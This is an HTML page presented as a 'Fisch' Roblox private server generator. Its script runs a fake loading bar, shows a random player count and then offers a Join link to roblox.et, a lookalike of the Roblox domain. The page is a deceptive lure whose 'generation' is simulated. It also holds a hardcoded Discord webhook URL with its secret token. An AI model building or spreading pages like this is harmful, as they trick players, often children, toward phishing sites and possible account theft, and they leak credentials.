<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fisch Private Server Generator</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Orbitron', sans-serif;
        }

        body {
            background: #000;
            color: #0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            overflow: hidden;
        }

        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px #0ff;
            animation: fadeIn 1s ease-in-out;
            width: 300px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 15px;
            text-shadow: 0 0 5px #0ff, 0 0 10px #00f;
        }

        #playerCount {
            font-size: 20px;
            margin-bottom: 15px;
            animation: glow 1.5s infinite alternate;
        }

        button {
            background: black;
            color: cyan;
            border: 2px solid cyan;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 0 10px cyan;
        }

        button:hover {
            background: cyan;
            color: black;
            box-shadow: 0 0 20px cyan;
        }

        .join {
            margin-top: 10px;
            display: none; /* Hidden initially */
        }

        /* Loading Bar */
        .loading-container {
            display: none;
            width: 100%;
            background: #111;
            border-radius: 5px;
            margin-top: 10px;
            height: 10px;
            overflow: hidden;
        }

        .loading-bar {
            width: 0%;
            height: 100%;
            background: cyan;
            transition: width 0.5s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        @keyframes glow {
            from { text-shadow: 0 0 5px cyan; }
            to { text-shadow: 0 0 15px cyan; }
        }

        @keyframes dots {
            0% { content: "."; }
            33% { content: ".."; }
            66% { content: "..."; }
            100% { content: ""; }
        }

        .loading-text::after {
            content: ".";
            animation: dots 1.5s infinite steps(1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Fisch Private Server Generator</h1>
        <p id="playerCount">Players: --/15</p>
        <button id="generateBtn">Generate</button>
        <div class="loading-container">
            <div class="loading-bar"></div>
        </div>
        <a id="joinBtn" href="https://www.roblox.et/games/16732694052/Fisch-MOBY?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
            <button class="join">Join</button>
        </a>
    </div>

    <script>
        document.getElementById("generateBtn").addEventListener("click", function() {
            let generateBtn = document.getElementById("generateBtn");
            let playerCount = document.getElementById("playerCount");
            let loadingBar = document.querySelector(".loading-bar");
            let loadingContainer = document.querySelector(".loading-container");
            let joinBtn = document.querySelector(".join");

            if (generateBtn.disabled) return; // Prevent multiple clicks

            generateBtn.disabled = true;
            generateBtn.innerText = "Generating";
            generateBtn.classList.add("loading-text");
            playerCount.innerText = "Generating...";

            loadingContainer.style.display = "block";
            loadingBar.style.width = "0%";

            let waitTime = 10; // Fixed 10-second wait time
            let interval = waitTime * 10; // Smooth progress bar

            let progress = 0;
            let progressInterval = setInterval(() => {
                progress += 100 / interval;
                loadingBar.style.width = `${progress}%`;
                if (progress >= 100) {
                    clearInterval(progressInterval);
                }
            }, 100);

            setTimeout(() => {
                let randomPlayers = Math.floor(Math.random() * 16); 
                playerCount.innerText = `Players: ${randomPlayers}/15`;

                generateBtn.innerText = "Generate";
                generateBtn.classList.remove("loading-text");
                generateBtn.disabled = false;

                loadingContainer.style.display = "none";
                joinBtn.style.display = "block"; // Show join button after loading

                // Send webhook message
                sendWebhook(randomPlayers);
            }, waitTime * 1000);
        });

        function sendWebhook(playerCount) {
            let webhookUrl = "https://discord.com/api/webhooks/1342415288687263765/fETgTKU3aTVtmRzJUuK9fBwJee3yuINkg6FicBid-Oy_zQMdUZl_7Vx602HlEgopVxET";
            
            let embed = {
                "embeds": [{
                    "title": "ðŸ”¹ Private Server Generated ðŸ”¹",
                    "description": `A private server was generated with **${playerCount}/15** players.`,
                    "color": 3447003, // Cyan color
                    "fields": [
                        {
                            "name": "ðŸ”— Server Link",
                            "value": "[Click to Join](https://www.roblox.et/games/16732694052/Fisch-MOBY?privateServerLinkCode=59816836148209918793607839663756)"
                        }
                    ],
                    "footer": {
                        "text": "Fisch Private Server Generator"
                    }
                }]
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(embed)
            });
        }
    </script>
</body>
</html>
